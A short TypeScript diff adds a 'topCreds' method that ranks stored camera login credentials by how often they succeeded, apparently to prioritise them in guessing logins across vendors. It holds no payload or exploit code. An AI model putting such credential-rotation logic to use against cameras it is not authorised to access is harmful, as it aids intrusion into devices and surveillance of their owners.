@@ -64,6 +64,7 @@ export interface CameraStore {
   getMeta(key: string): string | null;
   recordCredSuccess(vendor: DeviceVendor | 'generic', username: string, password: string): void;
   preferredCreds(vendor: DeviceVendor | 'generic'): Array<[string, string]>;
+  topCreds(limit?: number): Array<[string, string]>;
   logAccess(cameraId: string, method: string, credential: string, success: boolean): void;
   saveThumb(deviceId: string, jpeg: Buffer): void;
   getThumb(deviceId: string): ThumbRecord | undefined;
@@ -267,6 +268,17 @@ class SqliteStore implements CameraStore {
     return rows.map((r) => [asStr(r.username), asStr(r.password)]);
   }
 
+  // GLOBAL hot-list: hangi vendor olursa olsun en çok tutan kimlikler (öne alınır).
+  topCreds(limit = 24): Array<[string, string]> {
+    const rows = this.db
+      .prepare(
+        `SELECT username, password FROM cred_rotation
+         ORDER BY success_count DESC, last_success DESC LIMIT ?`,
+      )
+      .all(limit);
+    return rows.map((r) => [asStr(r.username), asStr(r.password)]);
+  }
+
   saveThumb(deviceId: string, jpeg: Buffer): void {
     this.thumbs.set(deviceId, { deviceId, jpeg, ts: Date.now() });
   }
@@ -426,6 +438,14 @@ class JsonStore implements CameraStore {
       .filter((c) => c.vendor === vendor || c.vendor === 'generic')
       .sort((a, b) => b.successCount - a.successCount || b.lastSuccess - a.lastSuccess)
       .slice(0, 20)
+      .map((c) => [c.username, c.password]);
+  }
+
+  // GLOBAL hot-list (JSON store).
+  topCreds(limit = 24): Array<[string, string]> {
+    return [...this.creds]
+      .sort((a, b) => b.successCount - a.successCount || b.lastSuccess - a.lastSuccess)
+      .slice(0, limit)
       .map((c) => [c.username, c.password]);
   }
 
